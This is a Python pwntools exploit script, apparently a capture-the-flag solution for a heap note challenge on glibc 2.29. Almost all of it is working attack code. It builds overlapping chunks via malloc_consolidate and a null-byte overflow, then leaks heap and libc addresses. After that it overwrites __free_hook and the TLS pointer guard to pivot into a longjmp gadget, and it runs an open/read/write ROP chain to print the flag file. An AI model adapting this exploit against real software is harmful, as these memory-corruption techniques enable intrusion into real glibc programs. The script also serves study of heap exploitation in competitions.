#!/usr/bin/env python
# -*- coding: utf-8 -*-
# by @tens
from pwn import *
import sys
import time
import random
host = 'plainnote.balsnctf.com'
port = 54321

binary = "./note"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def c(size,content):
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(size))
  r.recvuntil(": ")
  r.send(content)
  pass

def d(index):
  r.recvuntil(": ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def s(index,start,end):
  r.recvuntil(": ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

def rol(val, r_bits, size=64):
    return (val << r_bits%size) & (2**size-1) | \
           ((val & (2**size-1)) >> (size-(r_bits%size)))


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)
  r.recvuntil("sha256(")
  prefix = r.recvuntil(" ")[:-1]
  r.recvuntil("(")
  diff = r.recvuntil(")")[:-1] 
  S = process("python pow.py {} {}".format(prefix,diff).split())
  r.sendafter(":",S.recvall())
  S.close()

if __name__ == '__main__':
  # clear heap
  c(0x420,"A")
  d(0)
  c(0x170,"A")
  d(0)
  c(0x150,"A")
  d(0)
  for i in xrange(5):
    c(0x40,"A")
  for i in xrange(5):
    d(i)
  c(0x20,"A") #  0
  c(0x20,"A") #  1
  c(0x20,"A") #  2
  # tcache 7
  for i in xrange(0x7):
    c(0x20,"A") # 3 ~ 9
  

  c(0x250,"10") # 10
  d(10)

  c(0x20,"10") # 10
  c(0x20,"11") # 11  Ready for fake successful unlink bin ~
  c(0x20,"12") # 12

  c(0x20,"13") # 13
  c(0x20,"14") # 14
  c(0x20,"15") # 15

  c(0x20,"16") # 16
  c(0x20,"17") # 17
  c(0x20,"18") # 18


  for i in xrange(7):
    d(i+3)
    
    
  d(17)
  d(11)
  d(14)
  c(0x500,"A") # 3 trigger malloc_consolidate
  d(3)
  d(10)
  c(0x500,"A") # 3 trigger malloc_consolidate
  d(3)
  d(16)
  c(0x500,"A") # 3 trigger malloc_consolidate
  d(3)
  c(0x50,"A") # 3 
  c(0x50,"D"*0x28 + p64(0x691)[:-1]) # 4  fake size 0x690
  c(0x50,"A"*0x30) # 5 fake bk->fd
  d(12)
  c(0x500,"A") # 6 trigger malloc_consolidate
  d(6)

  # clear 0x30 tcache
  c(0x20,"A") # 6 
  c(0x20,"A") # 7
  c(0x20,"A") # 8 
  c(0x20,"A") # 9
  c(0x20,"A") # 10
  c(0x20,"A") # 11
  c(0x20,"A") # 12

  c(0x20,"D"*8) # 14 fake fd->bk
  for i in xrange(7):
    d(6+i)
  c(0x20,"A") # 6

  c(0x500,"C"*8) # 7
  c(0x4f0,"C"*8) # 8
  d(7)

  c(0x80,"1") # 7
  c(0x90,"2") # 9
  c(0x2d8,"3") # 10
  c(0xf8,"A"*0xf0 + p64(0x690)) # 11  fake prev size & null byte overflow
  d(8) # ====== top chunk merge , overlap success ======
  c(0xb0,"D") # 8
  d(8)
  c(0x1000,"E") # 8
  c(0x1000,"F") # 12
  c(0x1000,"F") # 16
  c(0x1000,"F") # 17
  d(16)
  d(8)
  s(15,"","")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x46e0
  print("heap = {}".format(hex(heap)))
  d(12)
  s(15,"","")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0
  print("libc = {}".format(hex(libc)))
  d(17)

  d(7)

  tls = libc - 0x28c0 # docker tls offset
  free_hook = libc + 0x1e75a8
  longjmp = libc + 0x43cc0 # overwrite tls + 0x30 and ROP in libc 2.29
  """
  longjmp code
  0x7f9d52ee1cc0:      mov    r8,QWORD PTR [rdi+0x30]
  0x7f9d52ee1cc4:      mov    r9,QWORD PTR [rdi+0x8]
  0x7f9d52ee1cc8:      mov    rdx,QWORD PTR [rdi+0x38]
  0x7f9d52ee1ccc:      ror    r8,0x11
  0x7f9d52ee1cd0:      xor    r8,QWORD PTR fs:0x30
  0x7f9d52ee1cd9:      ror    r9,0x11
  0x7f9d52ee1cdd:      xor    r9,QWORD PTR fs:0x30
  0x7f9d52ee1ce6:      ror    rdx,0x11
  0x7f9d52ee1cea:      xor    rdx,QWORD PTR fs:0x30
  0x7f9d52ee1cf3:      nop
  0x7f9d52ee1cf4:      mov    rbx,QWORD PTR [rdi]
  0x7f9d52ee1cf7:      mov    r12,QWORD PTR [rdi+0x10]
  0x7f9d52ee1cfb:      mov    r13,QWORD PTR [rdi+0x18]
  0x7f9d52ee1cff:      mov    r14,QWORD PTR [rdi+0x20]
  0x7f9d52ee1d03:      mov    r15,QWORD PTR [rdi+0x28]
  0x7f9d52ee1d07:      mov    eax,esi
  0x7f9d52ee1d09:      mov    rsp,r8
  0x7f9d52ee1d0c:      mov    rbp,r9
  0x7f9d52ee1d0f:      nop
  0x7f9d52ee1d10:      jmp    rdx
	"""

  c(0xf0,"A"*0xc0 + p64(tls + 0x30)) # 7
  d(9)
  c(0xa0,"Z"*0x50 + p64(free_hook)) # 8
  d(7)
  d(8)
  c(0x80,"D") # 7
  c(0x90,"D") # 8

  d(0)
  d(1)
  d(2)
  c(0x80,p64(0)) # 0
  c(0x90,p64(longjmp)) # 1
  pop_rax = libc + 0x0000000000047cf8
  pop_rdi = libc + 0x0000000000026542
  pop_rdx = libc + 0x000000000012bda6
  pop_rsi = libc + 0x0000000000026f9e
  syscall = libc + 0x00000000000cf6c5


  rop_addr = heap + 0x28c0
  flag_path = heap + 0x2880
  rip = pop_rax
  rop = (p64(2) + p64(pop_rdi) + p64(flag_path) + p64(pop_rsi) + p64(0) + p64(syscall) + 
         p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) +p64(syscall) +
         p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) +p64(syscall))
  c(0x500,"/home/note/flag\x00".ljust(0x30,"\x00") + p64(rol(rop_addr,0x11)) + p64(rol(rip,0x11)) + rop) # 2
  print("longjmp = {}".format(hex(longjmp)))

  d(2)


  r.interactive()